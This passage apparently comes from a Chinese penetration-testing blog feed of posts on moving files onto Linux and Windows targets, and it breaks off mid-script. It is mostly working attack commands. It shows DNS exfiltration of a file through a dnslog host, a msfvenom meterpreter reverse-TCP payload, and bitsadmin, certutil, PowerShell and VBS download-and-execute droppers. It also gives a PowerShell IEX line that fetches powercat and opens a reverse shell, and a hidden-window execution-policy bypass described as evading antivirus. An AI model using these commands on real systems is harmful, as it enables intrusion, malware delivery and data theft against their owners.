src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122123954724.png" alt="image-20240122123954724"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sftp -<span class="hljs-selector-tag">p</span> 指定端口 -<span class="hljs-selector-tag">i</span> 私钥文件<br></code></pre></td></tr></table></figure><h1 id="dns传输数据"><a href="#dns传输数据" class="headerlink" title="dns传输数据"></a>dns传输数据</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat test | xxd -p -c 16 | while read line; do host $line.sau547.dnslog.cn; done<br></code></pre></td></tr></table></figure><p>然后利用dns解析处结果</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122124512470.png" alt="image-20240122124512470"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122124519368.png" alt="image-20240122124519368"></p><h1 id="脚本语言的文件传输"><a href="#脚本语言的文件传输" class="headerlink" title="脚本语言的文件传输"></a>脚本语言的文件传输</h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;file_put_contents(&quot;5555.elf&quot;,file_get_contents(&quot;http://192.168.81.229/5555.elf&quot;));</span><br><span class="hljs-string"># file_put_contents: 将一个字符串写入文件</span><br><span class="hljs-string"># file_get_contents: 将整个文件读入一个字符串</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&quot;import urllib.request;u=urllib.request.urlopen(&#x27;http://192.168.81.229/5555.elf&#x27;);f=open(&#x27;c:\\temp\\win.hta&#x27;,&#x27;w&#x27;);f.write(u.read().decode(&#x27;utf-8&#x27;))&quot;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python2 -c <span class="hljs-string">&quot;import urllib2;u=urllib2.urlopen(&#x27;http://192.168.81.229/5555.elf&#x27;);f=open(&#x27;c:\\temp\\win.hta&#x27;,&#x27;w&#x27;);f.write(u.read());f.close()&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#!ruby</span><br><span class="hljs-comment">#!/usr/bin/ruby</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;net/http&#x27;</span><br><span class="hljs-title class_">Net</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:HTTP</span>.start(<span class="hljs-string">&quot;192.168.81.229&quot;</span>) &#123; |<span class="hljs-params">http</span>| r = http.get(<span class="hljs-string">&quot;/5555.elf&quot;</span>)<br>  open(<span class="hljs-string">&quot;/tmp/5555.elf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) &#123; |<span class="hljs-params">file</span>| file.write(r.body)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ruby -e &quot;require &#x27;net/http&#x27;;Net::HTTP.start(&#x27;192.168.81.229&#x27;) &#123; |http|r = http.get(&#x27;/5555.elf&#x27;);open(&#x27;/tmp/5555.elf&#x27;, &#x27;wb&#x27;) &#123; |file| file.write(r.body)&#125;&#125;&quot;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows文件传输</title>
    <link href="/2024/01/22/%E6%B8%97%E9%80%8F/windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
    <url>/2024/01/22/%E6%B8%97%E9%80%8F/windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h1><p>BITSAdmin 是一个命令行工具，可以使用它创建下载或上传作业，并监视其进度。  </p><p>现在尝试使用</p><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.81.238 <span class="hljs-attribute">lport</span>=6666 -f hta-psh &gt; 6666.hta<br></code></pre></td></tr></table></figure><h2 id="使用apache开启网站"><a href="#使用apache开启网站" class="headerlink" title="使用apache开启网站"></a>使用apache开启网站</h2><p>都是开启http服务器，其实使用python http.server其实也是可以的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo systemctl status apache2<br>sudo systemctl start apache2 <span class="hljs-comment"># 注意如果发现启动不了可能是端口占用，cs也会占用80端口</span><br><span class="hljs-comment"># or</span><br>sudo service apache2 start<br></code></pre></td></tr></table></figure><h2 id="在目标主机下载文件"><a href="#在目标主机下载文件" class="headerlink" title="在目标主机下载文件"></a>在目标主机下载文件</h2><p>对应的场景应该是我们网站rce的方法进行的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bitsadmin <span class="hljs-regexp">/transfer shell http:/</span><span class="hljs-regexp">/192.168.79.138/</span>win7.exe C:\windows\temp\win7.exe<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122101340770.png" alt="image-20240122101340770"></p><p>发现有进度的下载</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122101543417.png" alt="image-20240122101543417"></p><h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122101848142.png" alt="image-20240122101848142"></p><p>发现已经有session</p><h2 id="查看log"><a href="#查看log" class="headerlink" title="查看log"></a>查看log</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122102424094.png" alt="image-20240122102424094"></p><h2 id="使用hta-payload"><a href="#使用hta-payload" class="headerlink" title="使用hta payload"></a>使用hta payload</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122102959034.png" alt="image-20240122102959034"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rundll32<span class="hljs-selector-class">.exe</span> url<span class="hljs-selector-class">.dll</span>,OpenURL hta文件地址<br>rundll32<span class="hljs-selector-class">.exe</span> url<span class="hljs-selector-class">.dll</span>,OpenURL C:\windows\temp\<span class="hljs-number">6666</span>.hta<br></code></pre></td></tr></table></figure><h1 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h1><p>Certutil.exe 是作为证书服务的一部分安装的命令行工具。 你可以使用 certutil.exe 显示证书  颁发机构 (CA) 配置信息、配置证书服务、备份和还原 CA 组件。  </p><h2 id="下载程序-执行"><a href="#下载程序-执行" class="headerlink" title="下载程序+ 执行"></a>下载程序+ 执行</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/win7.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\win7.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\win7.<span class="hljs-keyword">exe</span><br><br></code></pre></td></tr></table></figure><h2 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122105249950.png" alt="image-20240122105249950"></p><h2 id="清楚缓存"><a href="#清楚缓存" class="headerlink" title="清楚缓存"></a>清楚缓存</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/win7.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">delete</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122105512803.png" alt="image-20240122105512803"></p><h1 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h1><blockquote><p>Invoke-Expression(IEX的别名)：用来把字符串当作命令执行。<br>WindowStyle Hidden(-w Hidden)：隐藏窗口<br>Nonlnteractive(-NonI)：非交互模式，PowerShell不为用户提供交互的提示。<br>NoProfile(-NoP)：PowerShell控制台不加载当前用户的配置文件。<br>Noexit(-Noe)：执行后不退出Shell。<br>EncodedCommand(-enc): 接受base64 encode的字符串编码，避免一些解析问题</p></blockquote><p>WebClient 类：提供用于将数据发送到由 URI 标识的资源以及从这样的资源接收数据的常用方法。  </p><p><a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.net.webclient?view=net-6.0">https://learn.microsoft.com/zh-cn/dotnet/api/system.net.webclient?view=net-6.0</a>  </p><p>DownloadString 方法：以 String 形式下载请求的资源。 可以以包含 URI 的 String 或 Uri 的形式指定要下载的资源。  </p><p><a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">https://learn.microsoft.com/zh-cn/dotnet/api/system.net.webclient.downloadstring?view=net-6.0</a></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$d</span> = New-Object <span class="hljs-params">System</span>.Net.WebClient<br><span class="hljs-variable">$d.DownloadFile</span>(<span class="hljs-string">&quot;http://xx.xx.xx.xx/file.zip&quot;</span>,<span class="hljs-string">&quot;c:/1.zip&quot;</span>)<br><br>powershell -c <span class="hljs-string">&quot;<span class="hljs-variable">$p</span>=new-object system.net.webclient;<span class="hljs-variable">$p.DownloadFile</span>(&#x27;https://pastebin.com/raw/M676F14U&#x27;,&#x27;s.txt&#x27;)&quot;</span><br>powershell -command <span class="hljs-string">&quot;(new-object system.net.webclient).downloadfile(&#x27;https://pastebin.com/raw/M676F14U&#x27;,&#x27;s.txt&#x27;)&quot;</span><br>powershell (new-object <span class="hljs-params">system</span>.net.webclient).downloadfile(<span class="hljs-string">&#x27;https://pastebin.com/raw/M676F14U&#x27;</span>,<span class="hljs-string">&#x27;s.txt&#x27;</span>)<br>powershell Invoke-WebRequest -uri <span class="hljs-string">&quot;https://pastebin.com/raw/M676F14U&quot;</span> -<span class="hljs-keyword">OutFile</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env</span>:temp\s.txt&quot;</span><br>powershell iwr -uri <span class="hljs-string">&quot;https://pastebin.com/raw/M676F14U&quot;</span> -<span class="hljs-keyword">OutFile</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env</span>:temp\s.txt&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">powershell -c &quot;<span class="hljs-built_in">IEX</span>(New-Object System.Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c <span class="hljs-number">192.168</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.229</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1234</span> -e cmd&quot; <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">wget</span><br>powershell <span class="hljs-built_in">curl</span><br></code></pre></td></tr></table></figure><p>可以使用类似的wget，curl指令</p><p>远程下载，本地执行</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (<span class="hljs-built_in">new</span>-ob ject <span class="hljs-keyword">system</span>.net.webclient).downloadfile(<span class="hljs-string">&#x27;http://127.0.0.1:8089&#x27;</span>,<span class="hljs-string">&#x27;notepad.exe&#x27;</span>);<span class="hljs-built_in">start</span>-<span class="hljs-built_in">process</span> notepad.exe<br></code></pre></td></tr></table></figure><p>powersehll可以实现免杀</p><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><p>在windows可能不存在，需要下载一下</p><h2 id="尝试下载"><a href="#尝试下载" class="headerlink" title="尝试下载"></a>尝试下载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">下载当个文件</span><br>scp root@192.168.81.229:/root/6666.hta 6666.hta<br><span class="hljs-meta prompt_"># </span><span class="language-bash">下载文件夹下所有文件</span><br>scp -r root@192.168.81.229:/var/www/html html/<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122112718443.png" alt="image-20240122112718443"></p><p>scp其实和ssh一样的，或者说是基于ssh的</p><p><code>-r</code>是指的整个文件夹</p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># scp上传单个文件</span><br>scp test.txt root@192.168.81.229:/tmp/test.txt<br><span class="hljs-comment"># scp上传文件夹</span><br>scp -r password/ root@192.168.81.229:/tmp/pass/<br></code></pre></td></tr></table></figure><h1 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 显示建立的网络共享连接</span><br>net <span class="hljs-keyword">use</span><br><span class="hljs-comment"># 与远程主机192.168.81.227的C盘建立网络共享连接，并映射远程主机C盘，到本地K盘</span><br>net <span class="hljs-keyword">use</span> <span class="hljs-symbol">k:</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">81.227</span>\c<span class="hljs-variable">$ </span>/<span class="hljs-symbol">user:</span>vagrant <span class="hljs-string">&quot;vagrant&quot;</span><br><span class="hljs-comment"># 列出本地K盘目录，也就是显示的远程主机192.168.81.227的C盘</span><br>dir <span class="hljs-symbol">k:</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 显示远程主机192.168.81.227的C盘目录文件</span><br><span class="hljs-attribute">dir</span> \\<span class="hljs-number">192.168.81.227</span>\c$<br><br><span class="hljs-comment"># 复制远程主机192.168.81.227的C盘目录下的6666.hta文件到本地</span><br><span class="hljs-attribute">copy</span> \\<span class="hljs-number">192.168.81.227</span>\c$\<span class="hljs-number">6666</span>.hta c:\<span class="hljs-number">6666</span>.hta<br><br><span class="hljs-comment"># 删除链接</span><br><span class="hljs-attribute">net</span> use k: /del  <span class="hljs-meta"> [/y 确定删除]</span><br></code></pre></td></tr></table></figure><h1 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>download.vbs</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27; 使用CreateObject()方法创建一个名为xPost的XMLHttpRequest对象，用于向远程服务器发送HTTP请求</span><br><span class="hljs-keyword">Set</span> xPost=<span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>)<br><span class="hljs-comment">&#x27; 调用Open()方法打开一个GET请求，指定要下载的文件的URL地址</span><br><span class="hljs-comment">&#x27; 最后一个参数为0表示异步请求，即不等待服务器响应直接执行下一条语句</span><br>xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.81.229/6666.exe&quot;</span>,<span class="hljs-number">0</span><br><span class="hljs-comment">&#x27; 调用Send()方法发送请求并获取响应内容。</span><br>xPost.Send()<br><span class="hljs-comment">&#x27; 使用CreateObject()创建一个名为sGet的ADODB.Stream对象，用于将响应内容保存到本地文件</span><br><span class="hljs-comment">&#x27; 设置sGet的Mode为3（adModeReadWrite），Type为1（adTypeBinary），表示以二进制方式读写流数据</span><br><span class="hljs-comment">&#x27; 然后调用Open()方法打开流，调用Write()方法写入响应内容，最后调用SaveToFile()方法将流数据保存到本地文件中</span><br><span class="hljs-keyword">set</span> sGet=<span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)<br>sGet.Mode=<span class="hljs-number">3</span><br>sGet.Type=<span class="hljs-number">1</span><br>sGet.Open()<br>sGet.Write xPost.ResponseBody<br>sGet.SaveToFile <span class="hljs-string">&quot;c:\6666.exe&quot;</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cscript</span> download.vbs<br></code></pre></td></tr></table></figure><h2 id="下载并运行"><a href="#下载并运行" class="headerlink" title="下载并运行"></a>下载并运行</h2><p>  download_run.vbs  </p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> Post = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>)<br><span class="hljs-keyword">Set</span> Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>Post.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.81.229/6666.exe&quot;</span>,<span class="hljs-number">0</span><br>Post.Send()<br><span class="hljs-keyword">Set</span> aGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)<br>aGet.Mode = <span class="hljs-number">3</span><br>aGet.Type = <span class="hljs-number">1</span><br>aGet.Open()<br>aGet.Write(Post.responseBody)<br>aGet.SaveToFile <span class="hljs-string">&quot;c:\6666.exe&quot;</span>,<span class="hljs-number">2</span><br>wscript.sleep <span class="hljs-number">1000</span><br>Shell.Run (<span class="hljs-string">&quot;c:\6666.exe&quot;</span>) <span class="hljs-comment">&#x27;延迟过后执行下载文件</span><br></code></pre></td></tr></table></figure><h2 id="cmd命令写入脚本并执行"><a href="#cmd命令写入脚本并执行" class="headerlink" title="cmd命令写入脚本并执行"></a>cmd命令写入脚本并执行</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">echo Set Post = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>) &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo Set Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>) &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo Post<span class="hljs-selector-class">.Open</span> <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.81.229/6666.exe&quot;</span>,<span class="hljs-number">0</span> &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo Post<span class="hljs-selector-class">.Send</span>() &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo Set aGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo aGet<span class="hljs-selector-class">.Mode</span> = <span class="hljs-number">3</span> &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo aGet<span class="hljs-selector-class">.Type</span> = <span class="hljs-number">1</span> &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo aGet<span class="hljs-selector-class">.Open</span>() &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo aGet<span class="hljs-selector-class">.Write</span>(Post.responseBody) &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo aGet<span class="hljs-selector-class">.SaveToFile</span> <span class="hljs-string">&quot;c:\6666.exe&quot;</span>,<span class="hljs-number">2</span> &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo wscript<span class="hljs-selector-class">.sleep</span> <span class="hljs-number">1000</span> &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>echo Shell<span class="hljs-selector-class">.Run</span> (<span class="hljs-string">&quot;c:\6666.exe&quot;</span>) &gt;&gt;zl<span class="hljs-selector-class">.vbs</span><br>cscript zl.vbs<br></code></pre></td></tr></table></figure><h2 id="wget-vbs"><a href="#wget-vbs" class="headerlink" title="wget.vbs"></a>wget.vbs</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27; 开启错误处理，当发生错误时跳过并继续执行下一条语句</span><br><span class="hljs-keyword">on</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br><span class="hljs-comment">&#x27; 使用&quot;Wscript.Arguments()&quot;获取命令行参数，分别赋值给iLocal、iRemote、iUser和iPass变量。</span><br><span class="hljs-comment">&#x27; iLocal表示本地保存文件的路径，</span><br><span class="hljs-comment">&#x27; iRemote表示远程文件的URL地址，</span><br><span class="hljs-comment">&#x27; iUser和iPass表示访问远程服务器需要的用户名和密码（如果不需要认证，则为空字符串）</span><br>iLocal=<span class="hljs-built_in">LCase</span>(Wscript.Arguments(<span class="hljs-number">1</span>))<br>iRemote=<span class="hljs-built_in">LCase</span>(Wscript.Arguments(<span class="hljs-number">0</span>))<br>iUser=<span class="hljs-built_in">LCase</span>(Wscript.Arguments(<span class="hljs-number">2</span>))<br>iPass=<span class="hljs-built_in">LCase</span>(Wscript.Arguments(<span class="hljs-number">3</span>))<br><span class="hljs-comment">&#x27; 使用CreateObject()创建一个名为xPost的XMLHttpRequest对象，用于向远程服务器发送HTTP请求</span><br><span class="hljs-keyword">set</span> xPost=<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>)<br><span class="hljs-comment">&#x27; 判断是否需要认证，调用Open()方法打开一个GET请求，最后调用Send()方法发送请求并获取响应内容</span><br><span class="hljs-keyword">if</span> iUser=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">and</span> iPass=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">then</span><br>xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,iRemote,<span class="hljs-number">0</span><br><span class="hljs-keyword">else</span><br>xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,iRemote,<span class="hljs-number">0</span>,iUser,iPass<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>xPost.Send()<br><span class="hljs-comment">&#x27; 使用CreateObject()创建一个名为sGet的ADODB.Stream对象，用于将响应内容保存到本地文件</span><br><span class="hljs-comment">&#x27; 设置sGet的Mode为3（adModeReadWrite），Type为1（adTypeBinary），表示以二进制方式读写流数据</span><br><span class="hljs-comment">&#x27; 然后调用Open()方法打开流，调用Write()方法写入响应内容，最后调用SaveToFile()方法将流数据保存到本地文件iLocal中</span><br><span class="hljs-keyword">set</span> sGet=<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)<br>sGet.Mode=<span class="hljs-number">3</span><br>sGet.Type=<span class="hljs-number">1</span><br>sGet.Open()<br>sGet.Write xPost.ResponseBody<br>sGet.SaveToFile iLocal,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cscript</span> wget.vbs http://<span class="hljs-number">192.168.81.229</span>/<span class="hljs-number">6666</span>.exe c:\<span class="hljs-number">6666</span>.exe<br></code></pre></td></tr></table></figure><h1 id="hta"><a href="#hta" class="headerlink" title="hta"></a>hta</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs hta">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script&gt;<br>// 使用new ActiveXObject()方法创建一个名为Object的MSXML2.XMLHTTP对象，用于向远程服务器发送HTTP请求<br>// 